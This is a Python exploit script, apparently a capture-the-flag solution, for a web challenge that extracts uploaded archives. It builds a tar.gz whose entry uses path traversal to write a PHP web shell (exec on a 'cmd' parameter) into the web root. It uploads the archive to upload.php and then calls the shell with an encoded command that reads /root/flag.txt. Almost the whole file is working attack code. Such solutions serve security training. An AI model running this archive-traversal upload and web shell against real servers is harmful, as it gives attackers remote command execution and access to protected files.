#!/usr/bin/env -S python3 -u
# -*- coding: utf-8 -*-
# This exploit template was generated via:

import os
import re
from io import BytesIO 
import tarfile
import requests
import time
from pwn import *

# Find flag by exact match or format
# log.success(find_flag(io.recvall()))
real_flag = open("./flag.txt", "r").readline().strip()
fake_flag = open("./flag-fake.txt", "r").readline().strip()
def find_flag(output):
    if not isinstance(output, str):
        output = output.decode(errors="ignore")
    # Match real flag
    if real_flag in output:
        return real_flag
    # Match fake flag
    if fake_flag in output:
        return fake_flag
    # Match possible local flag
    with open("/flag.txt", "r") as local:
        locl_flag = local.readline().strip()
        if locl_flag in output:
            return locl_flag
    # Match regexp flag
    r = find_flag_fmt(output)
    if r is not None:
        return r
    # Definitely no flag found
    return None

# Find flag by format
# log.success(find_flag_fmt(io.recvall()))
ffmt = re.compile(r"gctf{.*}")
def find_flag_fmt(output):
    if not isinstance(output, str):
        output = output.decode(errors="ignore")
    m = ffmt.search(output)
    if m is None:
        return None
    return m.group(0)

protocol = os.environ.get("PROTOCOL", "http")
domain = os.environ.get("DOMAIN", "localhost")
host = os.environ.get("HOST", "localhost")

port = int(os.environ.get("PORT", "1337"))

def get_subdomain_from_instance():
    print(f"[+] If you run distrun this might take a bit")
    io = connect(host, port)
    io.sendlineafter(b"start a new instance\n", b"", timeout=5)
    data = io.recvuntil(b"Wait some time", timeout=5).decode().strip()
    res_ins = re.search("\[\+\] http.*\/\/([a-zA-Z:\/\.\d]*)", data)
    res = re.search("\[\+\] (http[a-zA-Z:\/\.\d]*)", data)
    return res[1].strip(), res_ins[1].strip()

try:
    url, instance_url = get_subdomain_from_instance()
    print(f"[+] Created new instance: {instance_url}")
    print("[+] Waiting 5 seconds until instance is up")
    time.sleep(5)
except:
    subdomain = "" 
    url = f"{protocol}://{host}:{port}"
    instance_url = f"{host}:{port}"
    print(f"[+] URL: {url}")

print("[+] Running exploit")

def log(message):
    print("[+] " + message, flush=True)

base_domain = url
if base_domain.endswith(".localhost:8080"):
    base_domain = "http://127.0.0.1:8080"

f = BytesIO()
with tarfile.open('/tmp/rce.tar.gz', 'w:gz', fileobj=f) as tar:
    # Add a file to the tar archive
    info = tarfile.TarInfo(name='../../var/www/html/databases/rev_shell.php')
    content = '''
<?php
echo exec($_GET['cmd']);
?> 



'''
    info.size = len(content)
    tar.addfile(info, BytesIO(content.encode('utf-8')))

base_url = base_domain 
post_url = base_url + '/upload.php'

with open('/tmp/rce.tar.gz', 'wb') as tar_file:
	tar_file.write(f.getvalue())
file = {'file': open('/tmp/rce.tar.gz', 'rb')}
    


# Make the POST request
response = requests.post(post_url, files=file, headers={"Host": instance_url})

# cd /tmp && tar czvf t /root/flag.txt && tar xzvf t && cat ./root/flag.txt
flag_res = requests.get(base_url + '/databases/rev_shell.php?cmd=cd%20%2Ftmp%20%26%26%20tar%20czvf%20t%20%2Froot%2Fflag.txt%20%26%26%20tar%20xzvf%20t%20%26%26%20cat%20.%2Froot%2Fflag.txt', headers={"Host": instance_url})

flag = find_flag(flag_res.content.decode())

if flag:
    print(f"\033[93m[+] Flag: {flag}\033[0m", flush=True)
    exit(0)

print("[+] Flag could not be found", flush=True)

exit(255)
